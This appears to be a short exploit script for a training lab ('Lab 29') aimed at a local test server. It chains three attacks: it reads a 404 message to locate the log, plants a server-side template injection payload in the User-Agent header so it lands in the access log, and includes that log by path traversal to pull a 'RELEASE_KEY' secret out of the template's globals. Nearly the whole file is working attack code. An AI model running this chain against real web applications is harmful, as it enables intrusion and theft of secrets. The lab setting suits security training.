#!/usr/bin/env bash
# Lab 29 — write the template into the access log, then include the log.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9290}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab29

"$H5I" browser open "$URL/view?page=home.md" --session "$SESSION" --new --capture >/dev/null

# 1. The 404 names the directory it looked in, which is where the log lives.
send "$SESSION" req_0 --set query.page=nope | body >&2; echo >&2

# 2. Poison: the payload travels in a header the server writes down verbatim.
send "$SESSION" req_0 \
    --set 'header.User-Agent={{page.__init__.__globals__["RELEASE_KEY"]}}' >/dev/null

# 3. Include the log. It is read as a template, so the line evaluates.
send "$SESSION" req_0 --set 'query.page=../access.log' | flag
